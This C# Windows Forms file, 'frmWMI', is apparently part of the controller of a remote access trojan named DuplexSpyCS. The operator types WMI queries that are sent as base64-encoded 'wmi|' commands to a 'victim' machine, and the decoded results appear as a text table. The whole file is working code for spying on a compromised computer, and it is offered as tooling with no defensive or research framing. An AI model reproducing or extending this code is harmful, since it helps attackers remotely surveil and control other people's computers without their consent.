using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmWMI : Form
    {
        public clsVictim v;
        private int idx_prompt;

        public frmWMI(clsVictim victim)
        {
            InitializeComponent();

            v = victim;
        }

        public void ShowOutput(string data)
        {
            List<string> columns = new List<string>();
            List<string[]> rows = new List<string[]>();
            foreach (string d1 in data.Split(','))
            {
                string d2 = clsCrypto.b64D2Str(d1);
                List<string> tmp = new List<string>();
                foreach (string d3 in d2.Split(','))
                {
                    string d4 = clsCrypto.b64D2Str(d3);
                    string[] s = d4.Split(';');
                    if (!columns.Contains(s[0]))
                        columns.Add(s[0]);
                    tmp.Add(s[1]);
                }
                rows.Add(tmp.ToArray());
            }

            int[] width_column = new int[columns.Count];
            for (int i = 0; i < columns.Count; i++)
                width_column[i] = columns[i].Length;

            for (int i = 0; i < rows.Count; i++)
            {
                for (int j = 0; j < rows[i].Length; j++)
                {
                    int len = rows[i][j].Length;
                    width_column[j] = len > width_column[j] ? len : width_column[j];
                }
            }

            Invoke(new Action(() =>
            {
                //string line = 
                string[] arr = Enumerable.Range(0, width_column.Length).Select(x => "{" + x.ToString() + "," + width_column[x].ToString() + "}").ToArray();
                string format = string.Join(" | ", arr);
                string seperate_line = string.Join(" + ", Enumerable.Range(0, width_column.Length).Select(x => new StringBuilder().Insert(0, "-", width_column[x]).ToString()).ToArray());

                richTextBox1.AppendText(string.Format(format, columns.ToArray()));
                richTextBox1.AppendText(Environment.NewLine);

                richTextBox1.AppendText(seperate_line);
                richTextBox1.AppendText(Environment.NewLine);

                foreach (string[] item in rows)
                {
                    richTextBox1.AppendText(string.Format(format, item));
                    richTextBox1.AppendText(Environment.NewLine);
                }

                richTextBox1.AppendText("> ");
                idx_prompt = richTextBox1.Text.Length;
            }));
        }

        void ProcessInput()
        {
            int idx_current = richTextBox1.Text.Length;
            string query = richTextBox1.Text[idx_prompt..idx_current];
            v.fnSendCommand("wmi|" + clsCrypto.b64E2Str(query));
        }

        void setup()
        {
            richTextBox1.AppendText("> ");
            idx_prompt = richTextBox1.Text.Length;
        }

        private void frmWMI_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                ProcessInput();
            }
            else if ((e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back) && richTextBox1.SelectionStart == idx_prompt)
            {
                e.Handled = true;
            }
        }

        private void richTextBox1_SelectionChanged(object sender, EventArgs e)
        {
            int sel = richTextBox1.SelectionStart;
            richTextBox1.SelectionStart = sel < idx_prompt ? idx_prompt : sel;
        }
    }
}
